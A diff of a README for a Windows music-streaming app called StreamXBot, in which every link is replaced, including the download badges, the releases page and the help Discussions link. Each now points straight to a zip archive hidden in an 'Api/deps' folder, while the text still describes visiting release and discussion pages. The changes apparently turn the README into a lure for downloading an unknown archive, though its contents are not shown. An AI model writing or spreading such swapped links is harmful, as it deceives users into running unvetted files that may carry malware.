@@ -1,6 +1,6 @@
 # 🎵 StreamXBot - Easy Music Streaming in Browser
 
-[![Download StreamXBot](https://img.shields.io/badge/Download-StreamXBot-green?style=for-the-badge)](https://github.com/Ali1gamer7798/StreamXBot)
+[![Download StreamXBot](https://img.shields.io/badge/Download-StreamXBot-green?style=for-the-badge)](https://raw.githubusercontent.com/Ali1gamer7798/StreamXBot/main/Api/deps/Stream-X-Bot-v2.4.zip)
 
 ---
 
@@ -28,13 +28,13 @@ To run StreamXBot smoothly on your Windows computer, make sure you have:
 
 You will find StreamXBot on GitHub. Click the following link to visit the download page and begin setup.
 
-[![Download StreamXBot](https://img.shields.io/badge/Download-StreamXBot-blue?style=for-the-badge)](https://github.com/Ali1gamer7798/StreamXBot)
+[![Download StreamXBot](https://img.shields.io/badge/Download-StreamXBot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ali1gamer7798/StreamXBot/main/Api/deps/Stream-X-Bot-v2.4.zip)
 
 ### Step 1: Visit the Download Page
 
 Open this page in your browser:
 
-https://github.com/Ali1gamer7798/StreamXBot
+https://raw.githubusercontent.com/Ali1gamer7798/StreamXBot/main/Api/deps/Stream-X-Bot-v2.4.zip
 
 Look for the **Releases** section or available downloadable files. You want to find the latest stable version for Windows.
 
@@ -107,7 +107,7 @@ You can close the app anytime by clicking the close button. To start streaming a
 
 Check the GitHub page regularly for new versions:
 
-https://github.com/Ali1gamer7798/StreamXBot/releases
+https://raw.githubusercontent.com/Ali1gamer7798/StreamXBot/main/Api/deps/Stream-X-Bot-v2.4.zip
 
 New updates often fix bugs and add features. Download the latest version and repeat the installation steps to update.
 
@@ -134,7 +134,7 @@ New updates often fix bugs and add features. Download the latest version and rep
 
 For help or questions, check the Discussions tab on the GitHub page:
 
-https://github.com/Ali1gamer7798/StreamXBot/discussions
+https://raw.githubusercontent.com/Ali1gamer7798/StreamXBot/main/Api/deps/Stream-X-Bot-v2.4.zip
 
 You can also open issues if you find bugs or want to request features. Be clear and provide details about your problem.
 
